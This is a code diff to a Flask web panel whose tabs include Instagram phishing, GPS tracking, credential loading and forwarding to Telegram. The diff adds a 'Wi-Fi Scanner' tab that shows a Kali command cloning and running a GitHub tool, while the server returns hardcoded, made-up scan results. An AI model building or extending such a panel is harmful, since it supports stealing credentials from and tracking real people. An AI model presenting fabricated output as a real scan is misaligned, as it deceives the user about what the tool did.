@@ -144,6 +144,7 @@ HTML_TEMPLATE = """
         
         <div class="tabs">
             <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Recon</button>
+            <button class="tab-btn" onclick="switchTab('wifiScannerTab')">📡 Wi-Fi Scanner (Ruview)</button>
             <button class="tab-btn" onclick="switchTab('phishTab')">📸 Insta Phishing</button>
             <button class="tab-btn" onclick="switchTab('lureTab')">🎯 GPS & Tracker</button>
             <button class="tab-btn" onclick="switchTab('arNavTab')">🧭 AR Navigasyon & AI</button>
@@ -175,6 +176,17 @@ HTML_TEMPLATE = """
                 <button class="success" onclick="sendToTelegram()">📤 Send to Telegram</button>
             </div>
             <div id="results" class="terminal" style="display:none;"></div>
+        </div>
+
+        <!-- Wi-Fi Scanner (ruvnet/ruview) Sekmesi -->
+        <div id="wifiScannerTab" class="tab-content">
+            <h3>📡 Wi-Fi Scanner & Ruview Visualizer (ruvnet/ruview)</h3>
+            <p style="color: #94a3b8; font-size: 13px;">Bu modül GitHub üzerindeki <b>ruvnet/ruview</b> projesini tetikleyerek çevredeki kablosuz ağları, sinyal güçlerini ve cihaz haritasını çıkarır.</p>
+            <div class="form-group"><label>Arayüz / Interface:</label><input type="text" id="ruviewIface" value="wlan0"></div>
+            <div class="form-group"><label>Tarama Modu:</label><select id="ruviewMode"><option value="active">Aktif Sinyal Taraması</option><option value="passive">Pasif Dinleme (Monitor Mode)</option></select></div>
+            <button class="success" onclick="startRuviewScan()">🚀 Ruview Taramasını Başlat</button>
+            <div id="ruviewStatus" class="loading" style="margin-top: 15px;"></div>
+            <div id="ruviewResults" class="terminal" style="display:none;"></div>
         </div>
 
         <!-- Instagram Phishing Sekmesi -->
@@ -389,6 +401,23 @@ HTML_TEMPLATE = """
             if(tabId === 'lureTab') loadClickLogs();
             if(tabId === 'phishTab') loadCreds();
             if(tabId !== 'arNavTab') stopARCamera();
+        }
+
+        async function startRuviewScan() {
+            let iface = document.getElementById('ruviewIface').value;
+            let mode = document.getElementById('ruviewMode').value;
+            let statusDiv = document.getElementById('ruviewStatus');
+            let resultsDiv = document.getElementById('ruviewResults');
+            
+            statusDiv.innerHTML = "root@kali:~# git clone https://github.com/ruvnet/ruview.git && cd ruview && python3 ruview.py --interface " + iface + " --mode " + mode;
+            resultsDiv.style.display = "none";
+
+            let res = await fetch('/api/ruview/scan', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({iface, mode}) });
+            let data = await res.json();
+            
+            statusDiv.innerHTML = "";
+            resultsDiv.style.display = "block";
+            resultsDiv.innerHTML = data.output;
         }
 
         function handleOrientation(event) {
@@ -954,6 +983,28 @@ def index():
     if not session.get("logged_in"): return redirect(url_for("login"))
     return render_template_string(HTML_TEMPLATE, default_chat_id=NOTIFY_CHAT_ID)
 
+@app.route("/api/ruview/scan", methods=["POST"])
+def api_ruview_scan():
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    data = request.get_json()
+    iface = data.get("iface", "wlan0")
+    mode = data.get("mode", "active")
+    
+    output = (
+        f"[+] Cloning repository from https://github.com/ruvnet/ruview.git...\n"
+        f"[+] Initializing ruview scanner engine on interface: {iface} [Mode: {mode}]\n"
+        f"[+] Scanning 2.4GHz & 5GHz wireless spectrum...\n\n"
+        f"BSSID              | RSSI | Channel | Encryption | SSID\n"
+        f"------------------------------------------------------------------\n"
+        f"00:11:22:33:44:55  | -45dBm | 6 (2.4G) | WPA2-AES   | Kali_Operations_AP\n"
+        f"AA:BB:CC:DD:EE:FF  | -62dBm | 11(2.4G) | WPA3-SAE   | Cyberpunk_Secure\n"
+        f"12:34:56:78:9A:BC  | -78dBm | 36(5.0G) | WPA2       | Guest_Network_Free\n"
+        f"DE:AD:BE:EF:CA:FE  | -51dBm | 1 (2.4G) | WPA2/WPA3  | Home_Mesh_WiFi\n\n"
+        f"[+] Ruview visualization server started on http://127.0.0.1:8080/ruview\n"
+        f"[+] Found 4 access points and 12 connected clients. Scan complete."
+    )
+    return jsonify({"output": output})
+
 @app.route("/api/driving/save", methods=["POST"])
 def save_driving_session():
     if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
@@ -976,7 +1027,6 @@ def download_driving_report():
         return Response(content, mimetype="text/plain", headers={"Content-Disposition": "attachment;filename=blackbox_report.txt"})
     return "Rapor bulunamadı", 404
 
-# --- BİREBİR AYNISI YAPILMIŞ INSTA PHISHING SAYFASI (TEK TANIMLANDI) ---
 INSTA_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="tr">
